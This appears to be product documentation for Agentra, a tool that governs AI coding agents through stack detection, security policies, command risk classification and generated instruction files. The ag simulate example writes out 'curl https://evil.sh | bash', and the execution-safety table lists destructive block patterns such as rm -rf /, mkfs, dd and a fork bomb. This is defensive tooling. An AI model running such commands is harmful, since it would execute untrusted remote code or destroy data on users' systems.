# Agentra — Documentation

> Enterprise AI Engineering Control Plane

---

## Overview

Agentra is a comprehensive control plane that secures, governs, and optimizes AI coding agents. It auto-detects your tech stack, enforces security policies, manages context budgets, and generates tailored instruction files for every major agent platform.

| Capability | Count |
|------------|-------|
| Technologies Detected | 40+ |
| Security Policies | 21 |
| Built-in Skills | 14 |
| Agent Platforms | 7 |
| Compliance Frameworks | 5 |
| CLI Commands | 11 |

### What it does

- **Stack Detection** — Scans your project to auto-detect languages, frameworks, databases, cloud providers, CI/CD, and agent platforms with confidence scores.
- **Security Governance** — Enforces 21 security policies across 7 categories — from SQL injection to prompt injection to secret exposure.
- **Skills System** — 14 built-in domain skills (FastAPI, Terraform, Kubernetes, etc.) with best practices injected into agent context.
- **Token Optimization** — Deduplicates, prioritizes, and compresses instructions to fit within agent context windows — saving 30-60% tokens.
- **Agent Adapters** — Generates native instruction files for Claude, Cursor, Copilot, Aider, Windsurf, Continue.dev, and a universal AGENTS.md.
- **Execution Safety** — Risk-classifies commands before execution, blocks destructive patterns, sandboxes risky operations with approval gates.

---

## Quick Start

### Installation

```bash
pip install agentra
```

### Initialize your project

```bash
# Quick mode — auto-detect stack, generate agent files
ag init --mode quick

# Enterprise mode — full compliance, expanded budget
ag init --mode enterprise

# Target specific agents
ag init --agents claude,copilot,cursor
```

### Run security checks

```bash
ag enforce
#   CRITICAL  SEC-001  no-hardcoded-secrets    config.py:12
#   HIGH      GIT-001  no-force-push           deploy.sh:8
#   Risk Score: 16.0 │ Blast Radius: high │ FAILED
```

### Check a command before running it

```bash
ag simulate "rm -rf /tmp/build"
#   Risk Level: CRITICAL
#   Reason: Matches dangerous pattern: rm -rf
#   Recommendation: Review carefully before executing
```

---

## Architecture

Agentra is built as a modular pipeline. Each component can be used independently or composed together through the CLI.

```
 Input
 ├── Project Files
 ├── Agent Commands
 └── Config (.agentra.yml)
       │
       ▼
 Detection & Analysis
 ├── Stack Detector
 ├── Governance Engine
 └── Compliance Engine
       │
       ▼
 Processing
 ├── Skills Registry
 ├── Token Optimizer
 ├── Risk Engine
 └── Execution Engine
       │
       ▼
 Output
 ├── CLAUDE.md
 ├── .cursorrules
 ├── copilot-instructions.md
 ├── AGENTS.md
 └── Reports (MD + HTML)
```

### Module Map

| Module | Purpose | Key Class |
|--------|---------|-----------|
| `detection/engine` | Auto-detect 40+ technologies with confidence scoring | `StackDetector` |
| `governance/engine` | Regex-based policy enforcement across files | `GovernanceEngine` |
| `governance/policies` | 21 built-in security policy rules | `ALL_POLICIES` |
| `skills/registry` | 14 domain-specific skill packs | `SkillRegistry` |
| `optimizer/engine` | Token deduplication, prioritization, compression | `TokenOptimizer` |
| `adapters/agents` | Generate instruction files for 7 agent platforms | `ADAPTER_REGISTRY` |
| `execution/engine` | Command risk classification & sandboxed execution | `ExecutionEngine` |
| `onboarding/engine` | Project initialization with 4 onboarding modes | `detect_and_build_config()` |
| `compliance/engine` | Map violations to SOC2, ISO27001, PCI DSS, HIPAA, NIST | `ComplianceEngine` |
| `risk/engine` | Risk scoring, blast radius, rollback suggestions | `compute_risk_score()` |
| `telemetry/audit` | Local-only JSON audit logging | `AuditLog` |
| `benchmarks/runner` | Before/after metrics for skills and engines | `BenchmarkRunner` |
| `renderers/` | HTML & Markdown report generation | `HtmlRenderer`, `MarkdownRenderer` |

---

## CLI Commands

### `ag init`

Initialize a project with Agentra. Detects your stack, generates security policies, and writes instruction files for your chosen agent platforms.

```bash
ag init [PATH] --mode quick|guided|enterprise|ci --agents claude,copilot,cursor
```

| Flag | Default | Description |
|------|---------|-------------|
| `--mode` | `quick` | Onboarding mode: quick, guided, enterprise, ci |
| `--agents` | auto-detect | Comma-separated list of agent platforms |

**What happens:**

1. Scans project for technologies, frameworks, and existing agent files
2. Builds a `ProjectConfig` based on the selected onboarding mode
3. Saves configuration to `.agentra.yml`
4. Generates instruction files for each agent platform

**Example:**

```bash
ag init --mode enterprise --agents claude,copilot
#   ✓ Detected stack: python, fastapi, postgresql, docker, github_actions
#   ✓ Config saved: .agentra.yml
#   ✓ CLAUDE.md written (2,340 tokens)
#   ✓ .github/copilot-instructions.md written (2,120 tokens)
```

<details>
<summary>Onboarding modes compared</summary>

| Mode | Security | Compliance | Token Budget (in/out/reserved) | Best for |
|------|----------|------------|-------------------------------|----------|
| **quick** | Standard | — | 12k / 4k / 2k | Fast dev setup |
| **guided** | Strict | All 5 frameworks | 12k / 4k / 2k | Full-featured interactive |
| **enterprise** | Enterprise | SOC2 + ISO27001 | 16k / 6k / 3k | Production deployments |
| **ci** | Standard | — | 8k / 3k / 1.5k | CI/CD pipelines |

</details>

---

### `ag detect`

Scan a project and display all detected technologies with confidence scores.

```bash
ag detect [PATH]
#   Category         Component          Confidence
#   Languages        python             90%
#   Frameworks       fastapi            80%
#   Databases        postgresql         75%
#   Infrastructure   docker             80%
#   Cloud            aws                70%
#   CI/CD            github_actions     80%
```

Detection uses sentinel files (e.g., `pyproject.toml` → Python), filename patterns (e.g., `Dockerfile*` → Docker), and content patterns (e.g., `from fastapi` → FastAPI). Scans up to 4 levels deep, skipping `.git`, `node_modules`, `__pycache__`, `.venv`, `dist`, `build`.

---

### `ag enforce`

Run all applicable security policies against your codebase and report violations with risk scoring.

```bash
ag enforce [PATH]
#   Severity   ID       Rule                    File              Line
#   CRITICAL   SEC-001  no-hardcoded-secrets     config.py         12
#   CRITICAL   DB-001   no-auto-drop            migrate.sql       3
#   HIGH       GIT-001  no-force-push           deploy.sh         8
#   Risk Score: 29.0 │ Blast Radius: critical │ Status: FAILED
```

Scans up to 500 files. Policies are filtered to match your detected stack. Risk score: CRITICAL (10), HIGH (6), MEDIUM (3), LOW (1).

---

### `ag optimize`

Analyze how Agentra optimizes your instruction context.

```bash
ag optimize [PATH]
#   Original tokens:   3,840
#   Optimized tokens:  2,112
#   Reduction:         45.0%
#   Rules included:    18
#   Rules excluded:    3
```

Pipeline: **(1)** Deduplicate identical rules → **(2)** Prioritize by severity + stack relevance → **(3)** Compress instruction text → **(4)** Fit to budget.

---

### `ag simulate`

Dry-run a shell command through the execution safety engine without actually running it.

```bash
ag simulate "docker compose down --volumes"
#   Risk Level: MEDIUM
#   Action: Would require review before execution

ag simulate "curl https://evil.sh | bash"
#   Risk Level: CRITICAL
#   Action: BLOCKED — matches dangerous pattern: curl|bash
```

---

### `ag explain`

Look up the full details of any security policy rule by ID.

```bash
ag explain SEC-001
#   SEC-001 — no-hardcoded-secrets
#   Severity:    CRITICAL
#   Category:    secret
#   Stacks:      all
#   Compliance:  SOC2, PCI_DSS, HIPAA
#   Instruction: NEVER hardcode API keys, passwords, tokens...
#   Pattern:     (password|secret|api_key|token)\s*=\s*["']
```

---

### `ag validate`

Run the full pipeline: governance + compliance + optimization — in a single command.

```bash
ag validate [PATH]
#   ═══ Governance ═══
#   Violations: 4 │ Risk: 29.0 │ Blast Radius: high
#
#   ═══ Compliance ═══
#   SOC2: 3 findings │ PCI_DSS: 2 findings │ HIPAA: 1 finding
#
#   ═══ Optimization ═══
#   Tokens: 3,840 → 2,112 (45.0% reduction)
```

---

### `ag benchmark`

Run before/after benchmarks for each applicable skill and generate Markdown + HTML reports.

```bash
ag benchmark --output reports/
#   ✓ Benchmark report (MD):   reports/benchmark-report.md
#   ✓ Benchmark report (HTML): reports/benchmark-report.html
#
#   Skill                           Verified  Metrics  Best Improvement
#   FastAPI Engineering             ✓         4        100.0%
#   Kubernetes Engineering          ✓         4        100.0%
#   Security Governance Engine      ✓         4        100.0%
```

Metrics measured per skill: **Instruction Token Cost**, **Security Policy Coverage**, **Context Relevance** (0-1 score), **Instruction Compression** ratio.

---

### `ag audit`

View the local audit log — chronological record of all Agentra actions.

```bash
ag audit --count 5
#   Timestamp            Action      Detail
#   2026-05-22 10:15:02  enforce     4 violations found
#   2026-05-22 10:14:58  detect      Stack: python, fastapi, docker
#   2026-05-22 10:14:55  init        Mode: enterprise, agents: claude
```

Logs stored locally in `.agentra/audit/` as JSON files. No external telemetry.

---

### `ag doctor`

Run a health check on your Agentra setup.

```bash
ag doctor [PATH]
#   ✓ Config .agentra.yml exists and is valid
#   ✓ CLAUDE.md is present
#   ✓ .github/copilot-instructions.md is present
#   ✗ .gitignore missing .agentra/audit/
#   Health: 3/4 checks passed
```

---

## Stack Detection

The detection engine identifies 40+ technologies by scanning sentinel files, filename patterns, and file content. Results are grouped into 8 categories with confidence scores.

### Supported Technologies

| Category | Technologies |
|----------|-------------|
| **Languages** | Python, TypeScript, JavaScript, Rust, Go, Java, C#, Ruby, PHP, Scala, Kotlin |
| **Frameworks** | FastAPI, Django, Flask, Express, Next.js, React, Vue, Angular, Spring Boot, Actix-web |
| **Databases** | PostgreSQL, MySQL, MongoDB, Redis, Snowflake, DynamoDB, SQLite, Elasticsearch |
| **Infrastructure** | Docker, Kubernetes, Terraform, Ansible, Helm |
| **Cloud** | AWS, Azure, GCP |
| **SDKs & Tools** | OpenAI, LangChain, Spark, Airflow, dbt, Kafka, MCP, Databricks |
| **CI/CD** | GitHub Actions, GitLab CI, Jenkins, CircleCI |
| **Agents** | Claude, Cursor, Copilot, Aider, Windsurf, Continue.dev |

### Detection Methods

| Method | Example | Confidence |
|--------|---------|------------|
| Sentinel files | `pyproject.toml` → Python | 0.9 |
| Filename patterns | `Dockerfile*` → Docker | 0.8 |
| Content patterns | `from fastapi` in .py → FastAPI | 0.8 |

---

## Governance Engine

The governance engine scans your codebase against security policies using regex pattern matching. It generates risk scores, blast radius estimates, and actionable explanations.

### How it works

1. **Policy Selection** — Filters policies by your detected stack. A Python/FastAPI project gets database, secret, and execution rules — but not Terraform-specific IAM policies.
2. **File Scanning** — Iterates through project files (max 500), applies regex patterns with `re.IGNORECASE`, and records violations with file path, line number, and context.
3. **Risk Assessment** — Computes a weighted risk score: CRITICAL = 10, HIGH = 6, MEDIUM = 3, LOW = 1. Blast radius is determined by the number of affected categories and max severity.
4. **Instruction Generation** — Produces human-readable security instructions from active policies — injected into agent instruction files.

---

## Security Policies

21 built-in policies across 7 security categories.

### Database (3 policies)

| ID | Name | Severity | Description |
|----|------|----------|-------------|
| DB-001 | no-auto-drop | **CRITICAL** | Never auto-execute DROP TABLE/DATABASE/SCHEMA without explicit approval |
| DB-002 | no-prod-mutations | **CRITICAL** | Block DELETE/UPDATE without WHERE clauses and raw SQL mutations |
| DB-003 | require-rollback | HIGH | All migration scripts must have a rollback plan |

### Execution (4 policies)

| ID | Name | Severity | Description |
|----|------|----------|-------------|
| EX-001 | no-inline-shell | HIGH | Avoid subprocess/os.system/eval/exec with untrusted input |
| EX-002 | no-curl-pipe-bash | **CRITICAL** | Never pipe remote scripts to shell (curl\|bash, wget\|sh) |
| EX-003 | no-arbitrary-code | **CRITICAL** | Block eval/exec of user-supplied strings |
| EX-004 | no-autonomous-destructive | **CRITICAL** | Block rm -rf, format, mkfs, dd without human approval |

### Secrets (3 policies)

| ID | Name | Severity | Description |
|----|------|----------|-------------|
| SEC-001 | no-hardcoded-secrets | **CRITICAL** | Never hardcode API keys, passwords, tokens, or connection strings |
| SEC-002 | no-key-logging | HIGH | Never log or print secrets, credentials, or tokens |
| SEC-003 | no-secret-persistence | HIGH | Don't write secrets to files, localStorage, or unencrypted stores |

### Git (3 policies)

| ID | Name | Severity | Description |
|----|------|----------|-------------|
| GIT-001 | no-force-push | HIGH | Never use git push --force on shared branches |
| GIT-002 | no-main-commits | HIGH | Don't commit directly to main/master — use feature branches |
| GIT-003 | no-secret-commits | **CRITICAL** | Never commit files that may contain secrets (.env, credentials, pem) |

### Infrastructure (3 policies)

| ID | Name | Severity | Description |
|----|------|----------|-------------|
| INF-001 | no-public-resources | HIGH | Don't create publicly accessible resources without explicit review |
| INF-002 | no-wildcard-iam | **CRITICAL** | Never use wildcard (*) IAM permissions — use least privilege |
| INF-003 | no-unencrypted-storage | HIGH | Always enable encryption at rest for storage resources |

### Prompt Injection (3 policies)

| ID | Name | Severity | Description |
|----|------|----------|-------------|
| PI-001 | no-prompt-injection | HIGH | Detect and block prompt injection patterns in inputs |
| PI-002 | detect-hidden-injections | **CRITICAL** | Detect hidden prompt injections via encoding, unicode, or system prompt overrides |
| PI-003 | validate-external-instructions | HIGH | Validate and sanitize any external instructions before processing |

### Runtime (2 policies)

| ID | Name | Severity | Description |
|----|------|----------|-------------|
| RT-001 | no-debug-prod | HIGH | Never enable debug mode in production |
| RT-002 | require-error-handling | HIGH | All API endpoints must have proper error handling |

---

## Skills Registry

Skills are domain-specific instruction packs that inject best practices into agent context. They activate automatically based on your detected stack.

### FastAPI Engineering
**Stacks:** python, fastapi · **Policies:** SEC-001, EX-001

Pydantic v2 models, dependency injection, async/await, HTTPException, lifespan events, middleware patterns, project structure conventions.

### Airflow DAG Engineering
**Stacks:** python, airflow · **Policies:** SEC-001, DB-002

TaskFlow API, no compute in DAGs, XCom for data passing, retry strategies, Connections/Secrets, Sensors, KubernetesPodOperator.

### Apache Spark Engineering
**Stacks:** python, spark · **Policies:** DB-002

DataFrame API over RDDs, avoid collect(), proper partitioning, broadcast joins, Delta Lake, adaptive query execution.

### Terraform IaC
**Stacks:** terraform · **Policies:** INF-001, INF-002, INF-003, SEC-001

Module composition, remote state, no hardcoded credentials, lifecycle rules, consistent tagging, workspace isolation.

### Kubernetes Engineering
**Stacks:** kubernetes · **Policies:** INF-001, SEC-001

Resource requests/limits, namespace isolation, securityContext, NetworkPolicies, Secrets management, liveness/readiness probes, RBAC.

### PostgreSQL
**Stacks:** postgresql · **Policies:** DB-001, DB-002, DB-003, SEC-001

Parameterized queries, connection pooling, migration management, index strategies, JSONB, Row-Level Security, transaction isolation.

### Snowflake
**Stacks:** snowflake · **Policies:** DB-001, DB-002, SEC-001

Warehouse sizing, COPY INTO, clustering keys, Time Travel, Secure Views, zero-copy cloning, cost monitoring.

### Databricks
**Stacks:** databricks · **Policies:** SEC-001, DB-002

Unity Catalog, Delta Lake best practices, Workflows, MLflow experiment tracking, Snowpark, Auto Loader.

### dbt
**Stacks:** dbt · **Policies:** DB-001

Staging → marts layering, data testing, source definitions, incremental models, documentation, exposures.

### Kafka
**Stacks:** kafka · **Policies:** SEC-001

Avro/Protobuf serialization, acks=all, idempotent producers, consumer groups, exactly-once transactions, dead letter queues.

### OpenAI SDK
**Stacks:** openai · **Policies:** SEC-001, PI-001, PI-002

Structured outputs, exponential backoff, tiktoken for counting, max_tokens limits, streaming, PII redaction, function calling.

### LangChain
**Stacks:** langchain · **Policies:** SEC-001, PI-001

LCEL chain composition, structured output parsers, error handling with fallbacks, callbacks, LangSmith tracing, RAG patterns, mock LLMs for testing.

### MCP Servers
**Stacks:** mcp · **Policies:** SEC-001, EX-001, PI-001

Tool definitions with JSON Schema, strict input validation, resource endpoints, prompt templates, authentication checks.

### Karpathy Engineering Philosophy
**Stacks:** all · **Policies:** none

Simple code paths, readable over clever, minimal abstractions, debuggable, deterministic, transparent logic, understandable in 5 minutes.

---

## Execution Safety

The execution engine risk-classifies every command before it runs. Destructive commands are blocked, risky ones sandboxed with approval gates.

### Risk Levels

| Level | Action | Example Patterns |
|-------|--------|------------------|
| **CRITICAL** | Blocked unless force-approved | `rm -rf /`, `mkfs`, `dd if=`, fork bomb, `curl\|bash`, `eval()`, `git push --force`, `DROP TABLE`, `format C:` |
| **HIGH** | Requires explicit approval | `sudo`, `chmod 777`, `chown`, `--no-verify` |
| **MEDIUM** | Review recommended | `pip install`, `npm install`, `apt-get install` |
| **LOW** | Auto-approved | `ls`, `cat`, `git status`, `python --version` |

### Execution Flow

- **classify_risk()** → Pattern matching against 16+ dangerous patterns
- **dry_run()** → Simulates execution, returns risk assessment without running
- **execute()** → If CRITICAL: blocks (unless `force=True`). Otherwise: sandboxes in subprocess with timeout, captures stdout/stderr, logs to audit trail.

---

## Agent Adapters

Agentra generates native instruction files for each supported platform.

| Platform | Output File | Format |
|----------|-------------|--------|
| **Claude** (Anthropic) | `CLAUDE.md` | Markdown |
| **Cursor** | `.cursorrules` | Markdown |
| **GitHub Copilot** | `.github/copilot-instructions.md` | Markdown |
| **Aider** | `.aider.conf.yml` | YAML (conventions block) |
| **Windsurf** | `.windsurfrules` | Markdown |
| **Continue.dev** | `.continue/config.json` | JSON (systemMessage) |
| **Universal** | `AGENTS.md` | Markdown (all sections) |

### Generated Content Structure

```markdown
# Agentra — Security Instructions

## Detected Stack
python, fastapi, postgresql, docker, github_actions

## Security Policies
- NEVER hardcode API keys, passwords, tokens, or connection strings
- NEVER auto-execute DROP TABLE without explicit approval
- NEVER use git push --force on shared branches
...

## Active Skills
- FastAPI: Use Pydantic v2, async endpoints, dependency injection
- PostgreSQL: Parameterized queries, connection pooling, RLS
...
```

---

## Token Optimizer

AI agent context windows are finite. The token optimizer ensures your security policies and skill instructions fit within budget while preserving the most critical content.

### Optimization Pipeline

1. **Deduplicate** — Removes duplicate policy rules (by ID). If two skills reference the same policy, it's included only once.
2. **Prioritize** — Sorts rules by severity (CRITICAL first) and stack relevance. Rules matching your detected stack score higher.
3. **Compress** — Strips blank lines, removes duplicate instruction lines, trims whitespace. Typically saves 15-25%.
4. **Fit to Budget** — If combined instruction text exceeds the token budget, trims lowest-priority rules first. Token estimation: ~4 chars per token.

---

## Compliance Frameworks

Agentra maps policy violations to industry compliance frameworks.

| Framework | Focus | Policy Count |
|-----------|-------|-------------|
| **SOC 2 Type II** | Access control, change management, risk assessment | 15 |
| **ISO/IEC 27001** | ISMS, operations security, infrastructure hardening | 3 |
| **PCI DSS v4.0** | Cardholder data protection, encryption | 7 |
| **HIPAA** | PHI protection, access controls, audit logging | 4 |
| **NIST CSF** | Identify, Protect, Detect, Respond, Recover | 9 |

---

## Onboarding Modes

| Mode | Security | Compliance | Token Budget (in/out/reserved) | Best for |
|------|----------|------------|-------------------------------|----------|
| **quick** | Standard | — | 12k / 4k / 2k | Fast dev setup |
| **guided** | Strict | All 5 frameworks | 12k / 4k / 2k | Full-featured interactive |
| **enterprise** | Enterprise | SOC2 + ISO27001 | 16k / 6k / 3k | Production deployments |
| **ci** | Standard | — | 8k / 3k / 1.5k | CI/CD pipelines |

---

*Generated by Agentra — Enterprise AI Engineering Control Plane*
